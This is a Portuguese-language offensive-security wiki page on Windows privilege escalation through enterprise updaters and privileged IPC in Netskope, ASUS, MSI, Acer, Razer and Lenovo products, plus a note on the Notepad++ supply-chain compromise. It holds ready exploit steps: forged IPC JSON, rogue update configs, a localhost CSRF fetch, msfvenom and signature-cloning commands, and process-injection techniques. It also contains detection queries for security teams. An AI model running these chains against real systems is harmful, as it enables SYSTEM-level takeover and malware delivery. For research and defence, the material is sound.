# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Esta página generaliza uma classe de cadeias de local privilege escalation no Windows encontradas em agentes e updaters de endpoint corporativos que expõem uma superfície de IPC de baixa fricção e um fluxo de update privilegiado. Um exemplo representativo é o Netskope Client for Windows < R129 (CVE-2025-0309), onde um usuário com poucos privilégios pode forçar o enrollment para um server controlado pelo atacante e então entregar um MSI malicioso que o serviço SYSTEM instala.

Ideias-chave que você pode reutilizar contra produtos similares:
- Abuse de um IPC localhost de um serviço privilegiado para forçar re-enrollment ou reconfiguração para um attacker server.
- Implementar os endpoints de update do vendor, entregar uma Trusted Root CA maliciosa e apontar o updater para um package malicioso, “signed”.
- Evadir weak signer checks (CN allow-lists), optional digest flags e propriedades MSI permissivas.
- Se o IPC for “encrypted”, derivar a key/IV de machine identifiers legíveis por qualquer usuário armazenados no registry.
- Se o service restringir callers por image path/process name, fazer injection em um processo allow-listed ou iniciar um suspenso e bootstrapar sua DLL via um patch mínimo de thread-context.

---
## 1) Forçando enrollment para um attacker server via localhost IPC

Muitos agents incluem um processo de UI em user-mode que fala com um serviço SYSTEM via localhost TCP usando JSON.

Observado no Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Fluxo do exploit:
1) Crie um JWT enrollment token cujos claims controlem o backend host (por exemplo, AddonUrl). Use alg=None para que nenhuma signature seja necessária.
2) Envie a mensagem IPC invocando o provisioning command com seu JWT e tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) O serviço começa a atingir seu rogue server para enrollment/config, por exemplo:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Se a verificação do caller for baseada em path/name, origine a request a partir de um vendor binary allow-listed (veja §4).

---
## 2) Hijacking the update channel para executar code como SYSTEM

Uma vez que o client fale com o seu server, implemente os endpoints esperados e direcione-o para um attacker MSI. Sequência típica:

1) /v2/config/org/clientconfig → Retorne JSON config com um updater interval muito curto, por exemplo:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Retorna um certificado CA em PEM. O serviço o instala no store Local Machine Trusted Root.
3) /v2/checkupdate → Forneça metadados apontando para um MSI malicioso e uma versão falsa.

Bypassing common checks seen in the wild:
- Signer CN allow-list: o serviço pode apenas verificar se o Subject CN é igual a “netSkope Inc” ou “Netskope, Inc.”. Sua rogue CA pode emitir um leaf com esse CN e assinar o MSI.
- CERT_DIGEST property: inclua uma propriedade benigna do MSI chamada CERT_DIGEST. Nenhuma enforcement na instalação.
- Optional digest enforcement: flag de config (por exemplo, check_msi_digest=false) desativa validação criptográfica extra.

Result: o serviço SYSTEM instala seu MSI de
C:\ProgramData\Netskope\stAgent\data\*.msi
executando código arbitrário como NT AUTHORITY\SYSTEM.

Patch-bypass lesson: se um vendor responder fazendo allow-list de um pequeno conjunto de domínios “trusted” em vez de autenticar criptograficamente a origem da update source, procure por redirectors ou reverse proxies do próprio vendor que ainda permitam direcionar o tráfego. No caso da Netskope, pesquisa pública posterior mostrou que um allow-list da era R129 ainda podia ser abusado via `rproxy.goskope.com`, que fazia proxy de conteúdo do Azure App Service controlado pelo attacker. Trate hostname allow-lists como um speed bump, não como uma trust boundary.

---
## 3) Forging encrypted IPC requests (when present)

A partir do R127, a Netskope encapsulava o IPC JSON em um campo encryptData que parece Base64. A engenharia reversa mostrou AES com key/IV derivados de valores do registry legíveis por qualquer usuário:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers podem reproduzir a encryption e enviar comandos criptografados válidos a partir de um standard user. Dica geral: se um agent de repente “encrypts” seu IPC, procure device IDs, product GUIDs, install IDs em HKLM como material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Alguns serviços tentam authenticate o peer resolvendo o PID da conexão TCP e comparando o image path/name contra binaries do vendor allow-listed localizados em Program Files (por exemplo, stagentui.exe, bwansvc.exe, epdlp.exe).

Dois bypasses práticos:
- DLL injection em um processo allow-listed (por exemplo, nsdiag.exe) e proxy IPC de dentro dele.
- Spawn de um binary allow-listed suspended e bootstrap da sua proxy DLL sem CreateRemoteThread (veja §5) para satisfazer regras de tamper impostas pelo driver.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Produtos frequentemente vêm com um minifilter/driver de OB callbacks (por exemplo, Stadrv) para remover direitos perigosos de handles para processos protegidos:
- Process: remove PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restringe a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Um loader em user-mode confiável que respeita essas constraints:
1) CreateProcess de um binary do vendor com CREATE_SUSPENDED.
2) Obtenha handles que você ainda pode usar: PROCESS_VM_WRITE | PROCESS_VM_OPERATION no process, e um thread handle com THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ou apenas THREAD_RESUME se você patchar o code em um RIP conhecido).
3) Sobrescreva ntdll!NtContinue (ou outro thunk cedo, garantidamente mapeado) com um pequeno stub que chama LoadLibraryW no path da sua DLL, depois volta.
4) ResumeThread para acionar seu stub in-process, carregando sua DLL.

Como você nunca usou PROCESS_CREATE_THREAD ou PROCESS_SUSPEND_RESUME em um process já protegido (você o criou), a policy do driver é satisfeita.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatiza uma rogue CA, assinatura de MSI malicioso e serve os endpoints necessários: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope é um custom IPC client que monta mensagens IPC arbitrárias (opcionalmente AES-encrypted) e inclui a injection de suspended-process para originar a partir de um binary allow-listed.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Ao enfrentar um novo endpoint agent ou uma suite “helper” de motherboard, um workflow rápido geralmente basta para dizer se você está diante de um alvo promissor de privesc:

1) Enumerate loopback listeners and map them back to vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Enumere candidate named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Minar dados de roteamento apoiados pelo registry usados por servidores IPC baseados em plugins:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Extraia primeiro os nomes dos endpoints, chaves JSON e IDs de comando do client em user-mode. Frontends Electron/.NET packed frequentemente vazam o schema completo:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Procure o predicado de confiança real, não apenas o caminho de código que eventualmente inicia o processo:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Padrões que valem priorizar:
- `CryptQueryObject`/certificate parsing sem `WinVerifyTrust` geralmente significa que “certificate exists” foi tratado como “certificate is trusted”, permitindo certificate cloning ou outros fake-signer tricks.
- Verificações de substring/suffix sobre `Origin`, `Referer`, download URLs, process names ou signer CNs não são authentication. `contains(".vendor.com")` normalmente é explorável com domínios parecidos controlados pelo atacante.
- Se a GUI de baixa privilege decide “the file is trusted” e o broker SYSTEM apenas consome esse resultado, patching ou reimplementing da DLL/JS do lado do client muitas vezes contorna a boundary por completo (Razer-style split validation).
- Se o broker copia um payload para `%TEMP%`/`C:\Windows\Temp` e depois valida ou agenda a execução a partir desse caminho, teste imediatamente janelas de TOCTOU replacement e também módulos plugin irmãos que exponham wrappers alternativos `ExecuteTask()` com checks mais fracos.

Para targets com muito uso de named-pipe, PipeViewer é uma forma rápida de identificar weak DACLs e pipes remotamente acessíveis antes de você começar a reverter o protocolo em profundidade.

Se o target autentica callers apenas por PID, image path ou process name, trate isso como um speed bump e não como uma boundary: injetar no client legítimo, ou fazer a conexão a partir de um processo allow-listed, muitas vezes já é suficiente para satisfazer os checks do server. Para named pipes especificamente, [esta página sobre client impersonation e pipe abuse](named-pipe-client-impersonation.md) cobre o primitive com mais profundidade.

---
## 8) Modular add-in brokers authenticated only by vendor signatures (Lenovo Vantage pattern)

Uma variação mais nova que vale caçar é o **signed-client RPC broker**: um processo desktop de baixa privilege assinado pela Lenovo fala com um serviço SYSTEM, e o serviço roteia comandos JSON para um conjunto de add-ins descritos em XML sob `%ProgramData%`. Uma vez que code execution é obtida **dentro de qualquer signed client aceito**, todo contrato `runas="system"` passa a fazer parte da sua attack surface.

Primitives de alto valor observados na pesquisa sobre Lenovo Vantage:
- **Confiar no caller porque ele é assinado pelo vendor**: pesquisadores alcançaram um authenticated context copiando um EXE assinado pela Lenovo para um diretório gravável e satisfazendo um DLL side-load (`profapi.dll`) para que código arbitrário rodasse dentro de um client em que o serviço já confiava.
- **Descoberta de attack surface guiada por manifest**: add-ins são declarados em `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; vários contratos rodam como `SYSTEM`, então enumerar esses manifests muitas vezes revela os verbos privilegiados reais mais rápido do que reverter o broker em si.
- **Bugs por comando atrás do authenticated channel**: uma vez dentro do client confiável, pesquisas públicas encontraram path-traversal + race conditions em verbs de update/install, abuso de raw-SQL em bases de dados de configurações privilegiadas e checks de caminho de registry baseados em substring que permitiam writes fora do hive pretendido.

Recon útil em um target:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Takeaway prático: sempre que um helper suite expõe um broker que primeiro autentica o **caller process** e só depois despacha dezenas de comandos de plugin/add-in, não pare após contornar a trust check da porta de entrada. Faça dump da tabela de manifest/contract e faça fuzz de cada verb de high-privilege de forma independente; o authenticated channel normalmente esconde vários bugs de second-stage.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub envia um user-mode HTTP service (ADU.exe) em 127.0.0.1:53000 que espera chamadas do browser vindas de https://driverhub.asus.com. O origin filter simplesmente faz `string_contains(".asus.com")` no header Origin e nas download URLs expostas por `/asus/v1.0/*`. Qualquer host controlado pelo atacante, como `https://driverhub.asus.com.attacker.tld`, portanto passa na checagem e pode emitir requests que alteram o estado a partir de JavaScript. Veja [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) para padrões adicionais de bypass.

Fluxo prático:
1) Registre um domínio que incorpore `.asus.com` e hospede uma webpage maliciosa nele.
2) Use `fetch` ou XHR para chamar um endpoint privileged (por exemplo, `Reboot`, `UpdateApp`) em `http://127.0.0.1:53000`.
3) Envie o JSON body esperado pelo handler – o frontend JS empacotado mostra o schema abaixo.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Até mesmo a CLI do PowerShell mostrada abaixo tem sucesso quando o header Origin é falsificado para o valor confiável:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Qualquer visita ao site do atacante via browser, portanto, se torna um local CSRF de 1-click (ou 0-click via `onload`) que aciona um helper SYSTEM.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` baixa executables arbitrários definidos no corpo JSON e os armazena em `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. A validação da URL de download reutiliza a mesma lógica de substring, então `http://updates.asus.com.attacker.tld:8000/payload.exe` é aceito. Após o download, o ADU.exe apenas verifica se o PE contém uma signature e se a string do Subject corresponde a ASUS antes de executá-lo – sem `WinVerifyTrust`, sem validation de cadeia.

Para weaponizar o fluxo:
1) Crie um payload (por exemplo, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone o signer da ASUS nele (por exemplo, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hospede `pwn.exe` em um domínio parecido com `.asus.com` e acione o UpdateApp via o browser CSRF acima.

Como tanto os filtros de Origin quanto os de URL são baseados em substring, e a checagem do signer apenas compara strings, o DriverHub baixa e executa o binary do atacante sob seu contexto elevado.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

O serviço SYSTEM do MSI Center expõe um protocolo TCP em que cada frame é `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. O componente principal (Component ID `0f 27 00 00`) inclui `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Seu handler:
1) Copia o executável fornecido para `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica a signature via `CS_CommonAPI.EX_CA::Verify` (o subject do certificate deve ser “MICRO-STAR INTERNATIONAL CO., LTD.” e `WinVerifyTrust` deve ter sucesso).
3) Cria uma scheduled task que executa o arquivo temporário como SYSTEM com argumentos controlados pelo atacante.

O arquivo copiado não fica bloqueado entre a verificação e `ExecuteTask()`. Um atacante pode:
- Enviar o Frame A apontando para um binary legítimo assinado pela MSI (garante que a checagem de signature passe e que a task seja enfileirada).
- Fazer race com mensagens Frame B repetidas apontando para um payload malicioso, sobrescrevendo `MSI Center SDK.exe` logo após a conclusão da verificação.

Quando o scheduler dispara, ele executa o payload sobrescrito sob SYSTEM, apesar de ter validado o arquivo original. A exploração confiável usa duas goroutines/threads que spam o CMD_AutoUpdateSDK até vencer a janela de TOCTOU.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Todo plugin/DLL carregado por `MSI.CentralServer.exe` recebe um Component ID armazenado em `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Os primeiros 4 bytes de um frame selecionam esse componente, permitindo que atacantes roteiem comandos para módulos arbitrários.
- Plugins podem definir seus próprios task runners. `Support\API_Support.dll` expõe `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` e chama diretamente `API_Support.EX_Task::ExecuteTask()` com **no signature validation** – qualquer usuário local pode apontá-lo para `C:\Users\<user>\Desktop\payload.exe` e obter execução SYSTEM de forma determinística.
- Sniffing do loopback com Wireshark ou instrumentar os binaries .NET no dnSpy revela rapidamente o mapeamento Component ↔ command; clientes Go/ Python customizados podem então reproduzir os frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) expõe `\\.\pipe\treadstone_service_LightMode`, e sua discretionary ACL permite clients remotos (por exemplo, `\\TARGET\pipe\treadstone_service_LightMode`). Enviar o command ID `7` com um file path invoca a rotina de criação de processo do serviço.
- A client library serializa um magic terminator byte (113) junto com args. Instrumentação dinâmica com Frida/`TsDotNetLib` (veja [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) para dicas de instrumentação) mostra que o handler nativo mapeia esse valor para um `SECURITY_IMPERSONATION_LEVEL` e um integrity SID antes de chamar `CreateProcessAsUser`.
- Trocar 113 (`0x71`) por 114 (`0x72`) cai no branch genérico que mantém o token SYSTEM completo e define um high-integrity SID (`S-1-16-12288`). O binary lançado, portanto, roda como SYSTEM sem restrições, tanto localmente quanto entre máquinas.
- Combine isso com a flag de installer exposta (`Setup.exe -nocheck`) para subir o ACC até em VMs de laboratório e testar o pipe sem hardware do vendor.

Esses bugs de IPC destacam por que serviços localhost precisam impor mutual authentication (ALPC SIDs, filtros `ImpersonationLevel=Impersonation`, token filtering) e por que todo helper de “run arbitrary binary” de cada módulo precisa compartilhar as mesmas verificações de signer.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

O Razer Synapse 4 adicionou outro padrão útil a essa família: um usuário com poucos privilégios pode pedir a um helper COM para iniciar um processo via `RzUtility.Elevator`, enquanto a decisão de confiança é delegada a uma DLL em user-mode (`simple_service.dll`) em vez de ser aplicada de forma robusta dentro da fronteira privilegiada.

Caminho de exploração observado:
- Instancie o objeto COM `RzUtility.Elevator`.
- Chame `LaunchProcessNoWait(<path>, "", 1)` para solicitar um launch elevado.
- No PoC público, o gate de PE-signature dentro de `simple_service.dll` é removido antes de emitir a requisição, permitindo que um executável arbitrário escolhido pelo atacante seja iniciado.

Invocação mínima em PowerShell:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Takeaway geral: ao reverter suites “helper”, não pare em localhost TCP ou named pipes. Verifique classes COM com nomes como `Elevator`, `Launcher`, `Updater` ou `Utility`, depois confirme se o serviço privilegiado realmente valida o binário de destino ou apenas confia em um resultado calculado por uma DLL client em user-mode que pode ser patchable. Esse padrão vai além da Razer: qualquer design dividido em que o broker de alta privilégio consome uma decisão allow/deny da parte de baixa privilégio é um candidato a superfície de privesc.

---
## Sequestro remoto da supply chain via validação fraca do updater (WinGUp / Notepad++)

Entre junho de 2025 e dezembro de 2025, atacantes que comprometeram a infraestrutura de hosting por trás do fluxo de update do Notepad++ serviram manifests maliciosos seletivamente para vítimas escolhidas. Updaters antigos baseados em WinGUp não verificavam totalmente a autenticidade do update, então uma resposta XML hostil podia redirecionar clientes para URLs controladas pelo atacante. Como o client aceitava conteúdo HTTPS sem impor tanto uma cadeia de certificados confiável quanto uma assinatura PE válida no installer baixado, as vítimas baixaram e executaram um `update.exe` NSIS trojanizado.

Fluxo operacional (sem exploit local necessário):
1. **Interceptação da infraestrutura**: comprometer CDN/hosting e responder às checagens de update com metadata do atacante apontando para uma URL de download maliciosa.
2. **NSIS trojanizado**: o installer baixa/executa um payload e abusa de duas cadeias de execução:
- **Bring-your-own signed binary + sideload**: empacotar o `BluetoothService.exe` assinado da Bitdefender e soltar uma `log.dll` maliciosa no seu caminho de busca. Quando o binário assinado é executado, o Windows faz sideload de `log.dll`, que decripta e carrega de forma reflective o backdoor Chrysalis (protegido por Warbird + API hashing para dificultar detecção estática).
- **Scripted shellcode injection**: o NSIS executa um script Lua compilado que usa APIs Win32 (por exemplo, `EnumWindowStationsW`) para injetar shellcode e carregar o Cobalt Strike Beacon.

Conclusões de hardening/detection para qualquer auto-updater:
- Imponha verificação de **certificado + assinatura** do installer baixado (faça pin do signer do vendor, rejeite CN/chain incompatíveis) e assine o próprio update manifest (por exemplo, XMLDSig). Bloqueie redirects controlados pelo manifest, a menos que sejam validados.
- Trate **BYO signed binary sideloading** como um pivot de detecção pós-download: alerte quando um EXE assinado de vendor carregar um nome de DLL de fora do seu caminho canônico de instalação (por exemplo, Bitdefender carregando `log.dll` de Temp/Downloads) e quando um updater soltar/executar installers a partir de temp com assinaturas não pertencentes ao vendor.
- Monitore **artefatos específicos de malware** observados nessa cadeia (úteis como pivots genéricos): mutex `Global\Jdhfv_1.0.1`, writes anômalos do `gup.exe` em `%TEMP%`, e estágios de injeção de shellcode dirigidos por Lua.
- O Notepad++ respondeu reforçando o WinGUp na v8.8.9 e posteriores: o XML retornado agora é assinado (XMLDSig), e builds mais novos impõem verificação de certificado + assinatura do installer baixado em vez de confiar apenas no transporte.

<details>
<summary>Cortex XDR XQL – sideloading de EXE assinado pela Bitdefender de <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> lançando um instalador que não é do Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

These patterns generalize to any updater that accepts unsigned manifests or fails to pin installer signers—network hijack + malicious installer + BYO-signed sideloading yields remote code execution under the guise of “trusted” updates.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
